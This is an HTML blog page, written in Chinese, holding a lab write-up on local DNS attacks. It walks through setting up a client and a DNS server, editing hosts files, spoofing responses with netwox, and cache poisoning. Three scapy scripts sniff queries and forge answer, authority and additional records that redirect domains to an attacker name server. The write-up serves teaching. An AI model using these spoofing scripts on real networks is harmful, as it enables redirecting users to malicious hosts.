@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>Local DNS attack - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_yg9cfy8wd6.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2020-11-13 21:38">
+      2020年11月13日 晚上
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      31
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <article class="markdown-body">
+              <h1 id="Local-DNS-Attack"><a href="#Local-DNS-Attack" class="headerlink" title="Local DNS Attack"></a>Local DNS Attack</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><ul>
+<li><p>DNS（Domain name system）域名系统是工作在应用层上面，是对域名和IP地址进行转换的，类似于ARP和RARP协议</p>
+</li>
+<li><p>在这里我们所要攻击的目标是本地的DNS服务器</p>
+</li>
+<li><p>整个基本DNS的基本实现思路</p>
+<p>  <img src="/2020/11/13/Local-DNS-attack/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p>
+</li>
+</ul>
+<h2 id="Part-Ⅰ"><a href="#Part-Ⅰ" class="headerlink" title="Part Ⅰ"></a>Part Ⅰ</h2><h3 id="task-1：配置用户机器"><a href="#task-1：配置用户机器" class="headerlink" title="task 1：配置用户机器"></a>task 1：配置用户机器</h3><p>用sudo vi head来编辑head文件</p>
+<p><img src="/2020/11/13/Local-DNS-attack/1-2.PNG" srcset="/img/loading.gif" alt="1-2"></p>
+<p>同时检查/etc/resolv.conf，将其他nameserver进行注解，保证只有一个nameserver只想我们需要的本地DNS服务器（每次重启都需要进行检查）</p>
+<p><img src="/2020/11/13/Local-DNS-attack/1-3.PNG" srcset="/img/loading.gif" alt="1-3"></p>
+<p>之后进行测试，输入下面命令</p>
+<pre><code class="hljs css"><span class="hljs-selector-tag">dig</span> <span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span></code></pre>
+
+<p>之后可以在用户机器上面用wireshark抓到对应的包</p>
+<p><img src="/2020/11/13/Local-DNS-attack/1-4.PNG" srcset="/img/loading.gif" alt="1-4"></p>
+<p>可以看到<strong>用户机器（10.0.2.4）</strong>向<strong>本地DNS服务器（10.0.2.5）</strong>发送了DNS请求并且本地DNS服务器进行了回复</p>
+<h3 id="task-2：建立一个本地DNS服务器"><a href="#task-2：建立一个本地DNS服务器" class="headerlink" title="task 2：建立一个本地DNS服务器"></a>task 2：建立一个本地DNS服务器</h3><p>按照步骤来进行修改对应的文件</p>
+<p><img src="/2020/11/13/Local-DNS-attack/2-1.PNG" srcset="/img/loading.gif" alt="2-1"></p>
+<p>之后使用DNS服务器来进行查询，依旧是ping <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p>
+<p>在本地的DNS服务器上面运行wireshark抓包，可以看到此时本地DNS服务器向一些DNS服务器进行询问</p>
+<p><img src="/2020/11/13/Local-DNS-attack/2-2.PNG" srcset="/img/loading.gif" alt="2-2"></p>
+<p>而之后再次在<strong>用户主机（10.0.2.4）</strong>上面ping <a href="http://www.baidu.com，会发现此时在**本地DNS服务器（10.0.2.5）**上面用wireshark抓包会发现没有对应的向其他DNS服务器询问的过程，而是直接访问了百度对应的主机" target="_blank" rel="noopener">www.baidu.com，会发现此时在**本地DNS服务器（10.0.2.5）**上面用wireshark抓包会发现没有对应的向其他DNS服务器询问的过程，而是直接访问了百度对应的主机</a></p>
+<p><img src="/2020/11/13/Local-DNS-attack/2-3.PNG" srcset="/img/loading.gif" alt="2-3"></p>
+<p>可以看到没有访问根服务器来进行递归查询的过程</p>
+<h3 id="task-3：在本地DNS服务器上面设置域"><a href="#task-3：在本地DNS服务器上面设置域" class="headerlink" title="task 3：在本地DNS服务器上面设置域"></a>task 3：在本地DNS服务器上面设置域</h3><ul>
+<li><p>设置对应的区域</p>
+<p>  <img src="/2020/11/13/Local-DNS-attack/3-1.PNG" srcset="/img/loading.gif" alt="3-1"></p>
+</li>
+<li><p>设置正向查找<strong>区域文件</strong>（实际DNS解析的存储的地方）</p>
+<p>  <img src="/2020/11/13/Local-DNS-attack/3-2.PNG" srcset="/img/loading.gif" alt="3-2"></p>
+<p>  这里可以看到在进行查询的时候<a href="http://www.example.com会被定位到192.168.0.101" target="_blank" rel="noopener">www.example.com会被定位到192.168.0.101</a></p>
+</li>
+<li><p>反向查找的区域文件和上面一样即可</p>
+</li>
+<li><p>之后dig <a href="http://www.example.com，被定位到192.168.0.101" target="_blank" rel="noopener">www.example.com，被定位到192.168.0.101</a></p>
+<p>  <img src="/2020/11/13/Local-DNS-attack/3-3.PNG" srcset="/img/loading.gif" alt="3-3"></p>
+</li>
+</ul>
+<h2 id="Part-Ⅱ"><a href="#Part-Ⅱ" class="headerlink" title="Part Ⅱ"></a>Part Ⅱ</h2><ul>
+<li><p>基本原理：在用户机器发送了一个DNS请求报文之后，攻击者伪造一个DNS response报文，将对应的域名定位到一台恶意主机</p>
+<p>  <img src="/2020/11/13/Local-DNS-attack/4-0.PNG" srcset="/img/loading.gif" alt="4-0"></p>
+</li>
+</ul>
+<h3 id="task-4：修改主机文件"><a href="#task-4：修改主机文件" class="headerlink" title="task 4：修改主机文件"></a>task 4：修改主机文件</h3><ul>
+<li><p>原理：在用户主机上面保存着一些host name和IP地址对应关系的条目，位于/etc/hosts中，这用来进行本地查找，并且会优先与DNS查询来进行，在这里进行修改的是<strong>用户主机</strong></p>
+</li>
+<li><p>具体实现：</p>
+<ul>
+<li><p>首先在进行修改HOST文件之前进行ping</p>
+<p>  <img src="/2020/11/13/Local-DNS-attack/4-1.PNG" srcset="/img/loading.gif" alt="4-1"></p>
+</li>
+<li><p>之后对HOST文件进行修改，选择将其重定位到百度的IP</p>
+</li>
+<li><p>然后重新进行ping</p>
+<p>  <img src="/2020/11/13/Local-DNS-attack/4-2.PNG" srcset="/img/loading.gif" alt="4-2"></p>
+<p>  会发现已经重定位到了百度的IP地址</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="task-5：对用户直接欺骗响应"><a href="#task-5：对用户直接欺骗响应" class="headerlink" title="task 5：对用户直接欺骗响应"></a>task 5：对用户直接欺骗响应</h3><ul>
+<li><p>原理：嗅探与欺骗，一些要求如下</p>
+<blockquote>
+<ol>
+<li>The source IP address must match the IP address of the DNS server. </li>
+<li>The destination IP address must match the IP address of the user’s machine. </li>
+<li>The source port number (UDP port) must match the port number that the DNS request was sent to (usually port 53).</li>
+<li>The destination port number must match the port number that the DNS request was sent from</li>
+<li>The UDP checksum must be correctly calculated.</li>
+<li>The transaction ID must match the transaction ID in the DNS request.</li>
+<li>The domain name in the question section of the reply must match the domain name in the question section of the request.</li>
+<li>The domain name in the answer section must match the domain name in the question section of the DNS request.</li>
+<li>The User’s computer must receive the attacker’s DNS reply before it receives the legitimate DNS response.</li>
+</ol>
+</blockquote>
+</li>
+<li><p>具体实现：</p>
+<ul>
+<li><p>首先在进行运行命令之前dig</p>
+<p>  <img src="/2020/11/13/Local-DNS-attack/5-1.PNG" srcset="/img/loading.gif" alt="5-1"></p>
+</li>
+<li><p>之后在<strong>attacker（10.0.2.7）</strong>查看一下netwox 105相关的东西</p>
+<pre><code class="hljs routeros">Title: Sniff <span class="hljs-keyword">and</span> send<span class="hljs-built_in"> DNS </span>answers
+Usage: netwox 105 -h hostname -H<span class="hljs-built_in"> ip </span>-a hostname -A<span class="hljs-built_in"> ip </span>[-d device]
+Parameters:
+ -h|--hostname hostname         hostname &#123;www.example.com&#125;
+ -H|--hostnameip<span class="hljs-built_in"> ip </span>            hostname<span class="hljs-built_in"> IP </span>&#123;1.2.3.4&#125;
+ -a|--authns hostname           authoritative name<span class="hljs-built_in"> server </span>&#123;ns.example.com&#125;
+ -A|--authnsip<span class="hljs-built_in"> ip </span>              authns<span class="hljs-built_in"> IP </span>&#123;1.2.3.5&#125;
+ -d|--device device             device name &#123;Eth0&#125;
+ --help2                        display help <span class="hljs-keyword">for</span> advanced parameters
+Example: netwox 105 -h <span class="hljs-string">"www.example.com"</span> -H <span class="hljs-string">"1.2.3.4"</span> -a <span class="hljs-string">"ns.example.com"</span> -A <span class="hljs-string">"1.2.3.5"</span>
+Example: netwox 105 --hostname <span class="hljs-string">"www.example.com"</span> --hostnameip <span class="hljs-string">"1.2.3.4"</span> --authns <span class="hljs-string">"ns.example.com"</span> --authnsip <span class="hljs-string">"1.2.3.5"</span></code></pre>
+
+<p>运行相关命令，在此之前刷新本地DNS的缓存</p>
+<pre><code class="hljs css"><span class="hljs-selector-tag">sudo</span> <span class="hljs-selector-tag">netwox</span> 105 <span class="hljs-selector-tag">--hostname</span> "<span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.net</span>" <span class="hljs-selector-tag">--hostnameip</span> "1<span class="hljs-selector-class">.2</span><span class="hljs-selector-class">.3</span><span class="hljs-selector-class">.4</span>" <span class="hljs-selector-tag">--authns</span> "<span class="hljs-selector-tag">ns</span><span class="hljs-selector-class">.example</span>" <span class="hljs-selector-tag">--authnsip</span> "1<span class="hljs-selector-class">.2</span><span class="hljs-selector-class">.3</span><span class="hljs-selector-class">.5</span>"</code></pre>
+</li>
+<li><p>运行结果</p>
+<p>  <img src="/2020/11/13/Local-DNS-attack/5-2.PNG" srcset="/img/loading.gif" alt="5-2"></p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="task-6：DNS缓存中毒攻击"><a href="#task-6：DNS缓存中毒攻击" class="headerlink" title="task 6：DNS缓存中毒攻击"></a>task 6：DNS缓存中毒攻击</h3><ul>
+<li><p>在这里，因为按照上面方法攻击用户的话只能是每次用户发一个DNS请求就伪造一个DNS响应，所以我们采取攻击用户主机的本地DNS服务器的方式</p>
+</li>
+<li><p><img src="/2020/11/13/Local-DNS-attack/6-0.PNG" srcset="/img/loading.gif" alt="6-0"></p>
+</li>
+<li><p>具体实现：输入下面netwox命令</p>
+  <pre><code class="hljs css"><span class="hljs-selector-tag">sudo</span> <span class="hljs-selector-tag">netwox</span> 105 <span class="hljs-selector-tag">--hostname</span> "<span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.net</span>" <span class="hljs-selector-tag">--hostnameip</span> "10<span class="hljs-selector-class">.2</span><span class="hljs-selector-class">.3</span><span class="hljs-selector-class">.4</span>" <span class="hljs-selector-tag">--authns</span> "<span class="hljs-selector-tag">ns</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.net</span>" <span class="hljs-selector-tag">--authnsip</span> "10<span class="hljs-selector-class">.2</span><span class="hljs-selector-class">.3</span><span class="hljs-selector-class">.5</span>" <span class="hljs-selector-tag">--ttl</span> 600 <span class="hljs-selector-tag">--filter</span> "<span class="hljs-selector-tag">src</span> <span class="hljs-selector-tag">host</span> 10<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.2</span><span class="hljs-selector-class">.5</span>" <span class="hljs-selector-tag">--spoofip</span> <span class="hljs-selector-tag">raw</span></code></pre>
+
+<p>  之后转存DNS缓存的内容，可以看到相应的欺骗的内容</p>
+<p>  <img src="/2020/11/13/Local-DNS-attack/6-1.PNG" srcset="/img/loading.gif" alt="6-1"></p>
+</li>
+</ul>
+<h3 id="task-7：DNS缓存中毒：针对权限部分"><a href="#task-7：DNS缓存中毒：针对权限部分" class="headerlink" title="task 7：DNS缓存中毒：针对权限部分"></a>task 7：DNS缓存中毒：针对权限部分</h3><p>在这里需要对于DNS报文格式、查询报文格式以及应答报文格式有所了解，参考blog：<a href="https://blog.csdn.net/liao152/article/details/45252387" target="_blank" rel="noopener">深入理解DNS报文格式</a></p>
+<ul>
+<li><p>这个task的原理就是在进行域名查询的时候进一步攻击DNS缓存，不仅仅是一个主机的映射，把整个域名映射到另一台DNS服务器上，而这台服务器是由attacker掌握的，这下就可以将原来域上的任何一个hostname映射到别的IP上面</p>
+</li>
+<li><p>具体实现：在attacker上面运行相应的嗅探和欺骗程序，之后在用户主机上面dig <a href="http://www.example.com命令" target="_blank" rel="noopener">www.example.com命令</a></p>
+<p>  DNS报文格式</p>
+<p>  <img src="/2020/11/13/Local-DNS-attack/6-2.PNG" srcset="/img/loading.gif" alt="6-2"></p>
+  <pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span>
+<span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">spoof_dns</span><span class="hljs-params">(pkt)</span>:</span>
+    <span class="hljs-keyword">if</span> (DNS <span class="hljs-keyword">in</span> pkt <span class="hljs-keyword">and</span> <span class="hljs-string">'www.example.net'</span> <span class="hljs-keyword">in</span> pkt[DNS].qd.qname):
+        <span class="hljs-comment"># Swap the source and destination IP address</span>
+        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
+        <span class="hljs-comment"># Swap the source and destination port number</span>
+        UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="hljs-number">53</span>)
+        <span class="hljs-comment"># The Answer Section</span>
+        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type=<span class="hljs-string">'A'</span>,ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">'10.0.2.123'</span>)
+        <span class="hljs-comment"># The Authority Section</span>
+        NSsec1 = DNSRR(rrname=<span class="hljs-string">'example.net'</span>, type=<span class="hljs-string">'NS'</span>, ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">'attacker32.com'</span>)
+        <span class="hljs-comment"># The Additional Section       </span>
+        Addsec1 = DNSRR(rrname=<span class="hljs-string">'attacker32.com'</span>, type=<span class="hljs-string">'A'</span>, ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">'10.2.3.4'</span>)
+        <span class="hljs-comment"># Construct the DNS packet</span>
+        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=<span class="hljs-number">1</span>, rd=<span class="hljs-number">0</span>, qr=<span class="hljs-number">1</span>,
+                 qdcount=<span class="hljs-number">1</span>, ancount=<span class="hljs-number">1</span>, nscount=<span class="hljs-number">1</span>, arcount=<span class="hljs-number">1</span>,
+                an=Anssec, ns=NSsec1 ,ar=Addsec1)
+        <span class="hljs-comment"># Construct the entire IP packet and send it out</span>
+        spoofpkt = IPpkt/UDPpkt/DNSpkt
+        send(spoofpkt)
+        <span class="hljs-comment"># Sniff UDP query packets and invoke spoof_dns().</span>
+pkt = sniff(filter=<span class="hljs-string">'udp and dst port 53'</span>, prn=spoof_dns)</code></pre>
+
+<p>  dig后的截图&amp;wireshark抓包结果</p>
+<p>  <img src="/2020/11/13/Local-DNS-attack/6-3.PNG" srcset="/img/loading.gif" alt="6-3"></p>
+<p>  <img src="/2020/11/13/Local-DNS-attack/6-4.PNG" srcset="/img/loading.gif" alt="6-4"></p>
+</li>
+</ul>
+<h3 id="task-8：瞄准另一个域"><a href="#task-8：瞄准另一个域" class="headerlink" title="task 8：瞄准另一个域"></a>task 8：瞄准另一个域</h3><ul>
+<li><p>实现的原理其实和上面并没有什么区别，只不过是额外多构造一个authority报文</p>
+</li>
+<li><p>具体实现</p>
+  <pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span>
+<span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">spoof_dns</span><span class="hljs-params">(pkt)</span>:</span>
+    <span class="hljs-keyword">if</span> (DNS <span class="hljs-keyword">in</span> pkt <span class="hljs-keyword">and</span> <span class="hljs-string">'www.example.net'</span> <span class="hljs-keyword">in</span> pkt[DNS].qd.qname):
+        <span class="hljs-comment"># Swap the source and destination IP address</span>
+        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
+        <span class="hljs-comment"># Swap the source and destination port number</span>
+        UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="hljs-number">53</span>)
+        <span class="hljs-comment"># The Answer Section</span>
+        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type=<span class="hljs-string">'A'</span>,ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">'10.0.2.123'</span>)
+        <span class="hljs-comment"># The Authority Section</span>
+        NSsec1 = DNSRR(rrname=<span class="hljs-string">'example.net'</span>, type=<span class="hljs-string">'NS'</span>, ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">'attacker32.com'</span>)
+        NSsec2 = DNSRR(rrname=<span class="hljs-string">'google.com'</span>, type=<span class="hljs-string">'NS'</span>, ttl=<span class="hljs-number">260000</span>, rdata=<span class="hljs-string">'attacker32.com'</span>) 	
+        <span class="hljs-comment"># The Additional Section</span>
+        Addsec1 = DNSRR(rrname=<span class="hljs-string">'attacker32.com'</span>, type=<span class="hljs-string">'A'</span>, ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">'1.2.3.4'</span>)
+        Addsec2 = DNSRR(rrname=<span class="hljs-string">'attacker32,com'</span>, type=<span class="hljs-string">'A'</span>, ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">'5.6.7.8'</span>)
+        
+        <span class="hljs-comment"># Construct the DNS packet</span>
+        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=<span class="hljs-number">1</span>, rd=<span class="hljs-number">0</span>, qr=<span class="hljs-number">1</span>,
+                 qdcount=<span class="hljs-number">1</span>, ancount=<span class="hljs-number">1</span>, nscount=<span class="hljs-number">2</span>, arcount=<span class="hljs-number">2</span>,
+                an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2) <span class="hljs-comment">#ar=Addsec1</span>
+        <span class="hljs-comment"># Construct the entire IP packet and send it out</span>
+        spoofpkt = IPpkt/UDPpkt/DNSpkt
+        send(spoofpkt)
+        <span class="hljs-comment"># Sniff UDP query packets and invoke spoof_dns().</span>
+pkt = sniff(filter=<span class="hljs-string">'udp and dst port 53 '</span>, prn=spoof_dns)</code></pre>
+
+<p>  运行截图，可以看到已经添加</p>
+<p>  <img src="/2020/11/13/Local-DNS-attack/8-1.PNG" srcset="/img/loading.gif" alt="8-1"></p>
+</li>
+</ul>
+<h3 id="task-9：针对Additional部分"><a href="#task-9：针对Additional部分" class="headerlink" title="task 9：针对Additional部分"></a>task 9：针对Additional部分</h3><ul>
+<li><p>具体实现</p>
+  <pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span>
+<span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">spoof_dns</span><span class="hljs-params">(pkt)</span>:</span>
+    <span class="hljs-keyword">if</span> (DNS <span class="hljs-keyword">in</span> pkt <span class="hljs-keyword">and</span> <span class="hljs-string">'www.example.net'</span> <span class="hljs-keyword">in</span> pkt[DNS].qd.qname):
+        <span class="hljs-comment"># Swap the source and destination IP address</span>
+        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
+        <span class="hljs-comment"># Swap the source and destination port number</span>
+        UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="hljs-number">53</span>)
+        <span class="hljs-comment"># The Answer Section</span>
+        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type=<span class="hljs-string">'A'</span>,ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">'123.123.123.123'</span>)
+        <span class="hljs-comment"># The Authority Section</span>
+        NSsec1 = DNSRR(rrname=<span class="hljs-string">'example.net'</span>, type=<span class="hljs-string">'NS'</span>, ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">'attacker32.com'</span>)
+        NSsec2 = DNSRR(rrname=<span class="hljs-string">'example.net'</span>, type=<span class="hljs-string">'NS'</span>, ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">'ns.example.net'</span>)
+        <span class="hljs-comment"># The Additional Section</span>
+        Addsec1 = DNSRR(rrname=<span class="hljs-string">'attacker32.com'</span>, type=<span class="hljs-string">'A'</span>, ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">'1.2.3.4'</span>)
+        Addsec2 = DNSRR(rrname=<span class="hljs-string">'ns.example.net'</span>, type=<span class="hljs-string">'A'</span>, ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">'5.6.7.8'</span>)
+        Addsec3 = DNSRR(rrname=<span class="hljs-string">'www.facebook.com'</span>, type=<span class="hljs-string">'A'</span>, ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">'3.4.5.6'</span>)
+        <span class="hljs-comment"># Construct the DNS packet</span>
+        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=<span class="hljs-number">1</span>, rd=<span class="hljs-number">0</span>, qr=<span class="hljs-number">1</span>,
+                 qdcount=<span class="hljs-number">1</span>, ancount=<span class="hljs-number">1</span>, nscount=<span class="hljs-number">2</span>, arcount=<span class="hljs-number">3</span>,
+                an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2/Addsec3) 
+        <span class="hljs-comment"># Construct the entire IP packet and send it out</span>
+        spoofpkt = IPpkt/UDPpkt/DNSpkt
+        send(spoofpkt)
+        <span class="hljs-comment"># Sniff UDP query packets and invoke spoof_dns().</span>
+pkt = sniff(filter=<span class="hljs-string">'udp and dst port 53'</span>, prn=spoof_dns)</code></pre>
+
+<p>  dig之后的显示</p>
+<p>  <img src="/2020/11/13/Local-DNS-attack/9-1.PNG" srcset="/img/loading.gif" alt="9-1"></p>
+<p>  之后观察DNS缓存的情况</p>
+<p>  <img src="/2020/11/13/Local-DNS-attack/9-2.PNG" srcset="/img/loading.gif" alt="9-2"></p>
+<p>  看到在additional部分中只有attacker32.com -&gt;1.2.3.4和ns.example.net -&gt;5.6.7.8成功的存入DNS缓存，我认为这是由于只有在Additional和Authority匹配的时候才会存入DNS缓存当中</p>
+</li>
+</ul>
+<h2 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h2>
+            </article>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Network-Security/">Network Security</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">电子邮件中DANE生态系统的纵向综合研究</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-6">
+                    
+                    
+                      <a href="/2020/11/10/%E5%8F%A3%E4%BB%A4%E7%A0%B4%E8%A7%A3%E5%AE%9E%E9%AA%8C/">
+                        <span class="hidden-mobile">口令破解实验</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
